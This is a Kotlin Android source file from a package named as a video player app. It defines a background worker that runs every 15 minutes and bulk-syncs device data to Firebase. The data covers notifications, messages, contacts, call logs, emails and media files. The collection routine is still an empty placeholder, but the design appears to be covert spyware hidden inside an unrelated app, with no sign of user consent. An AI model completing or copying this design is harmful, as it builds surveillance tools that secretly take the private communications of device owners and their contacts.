package com.jumpy.videoplayerapp.services

import android.content.Context
import android.util.Log
import androidx.work.*
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class FirebaseSyncWorker(
    context: Context,
    params: WorkerParameters
) : CoroutineWorker(context, params) {
    
    companion object {
        private const val TAG = "FirebaseSyncWorker"
        private const val WORK_NAME = "firebase_sync_worker"
        
        // Schedule periodic sync
        fun schedulePeriodicSync(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(false)
                .build()
            
            val syncRequest = PeriodicWorkRequestBuilder<FirebaseSyncWorker>(
                15, TimeUnit.MINUTES, // Sync every 15 minutes
                5, TimeUnit.MINUTES   // Flex period
            )
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                .addTag("firebase_sync")
                .build()
            
            WorkManager.getInstance(context)
                .enqueueUniquePeriodicWork(
                    WORK_NAME,
                    ExistingPeriodicWorkPolicy.KEEP,
                    syncRequest
                )
            
            Log.d(TAG, "✅ Periodic Firebase sync scheduled")
        }
        
        // Schedule one-time sync
        fun scheduleOneTimeSync(context: Context) {
            val constraints = Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build()
            
            val syncRequest = OneTimeWorkRequestBuilder<FirebaseSyncWorker>()
                .setConstraints(constraints)
                .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.MINUTES)
                .addTag("firebase_sync_immediate")
                .build()
            
            WorkManager.getInstance(context)
                .enqueue(syncRequest)
            
            Log.d(TAG, "✅ One-time Firebase sync scheduled")
        }
        
        // Cancel all sync work
        fun cancelAllSync(context: Context) {
            WorkManager.getInstance(context)
                .cancelAllWorkByTag("firebase_sync")
            WorkManager.getInstance(context)
                .cancelAllWorkByTag("firebase_sync_immediate")
            
            Log.d(TAG, "❌ All Firebase sync work cancelled")
        }
    }
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d(TAG, "🔄 Starting Firebase sync work")
            
            val firebaseService = FirebaseService.getInstance(applicationContext)
            
            // Collect data from device
            val syncData = collectDeviceData()
            
            // Perform bulk sync
            val success = firebaseService.bulkSync(syncData)
            
            if (success) {
                Log.d(TAG, "✅ Firebase sync completed successfully")
                Result.success()
            } else {
                Log.w(TAG, "⚠️ Firebase sync partially failed")
                Result.retry()
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Firebase sync failed", e)
            Result.retry()
        }
    }
    
    private suspend fun collectDeviceData(): FirebaseService.BulkSyncData {
        // This is where you would collect actual device data
        // For now, we'll return empty data as placeholder
        
        return FirebaseService.BulkSyncData(
            notifications = emptyList(),
            messages = emptyList(),
            contacts = emptyList(),
            callLogs = emptyList(),
            emails = emptyList(),
            mediaFiles = emptyList()
        )
    }
} 